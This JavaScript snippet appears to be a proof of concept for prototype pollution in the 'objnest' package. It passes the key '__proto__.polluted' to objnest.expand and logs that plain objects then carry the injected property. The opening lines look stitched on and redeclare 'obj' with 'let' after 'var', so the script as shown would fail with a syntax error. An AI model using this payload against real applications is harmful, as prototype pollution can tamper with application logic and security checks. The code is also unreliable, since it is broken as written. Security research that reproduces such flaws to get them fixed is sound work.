var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const objnest = require('objnest');
let obj = {};
console.log({}.polluted);
objnest.expand({ '__proto__.polluted': 'yes' });
console.log({}.polluted);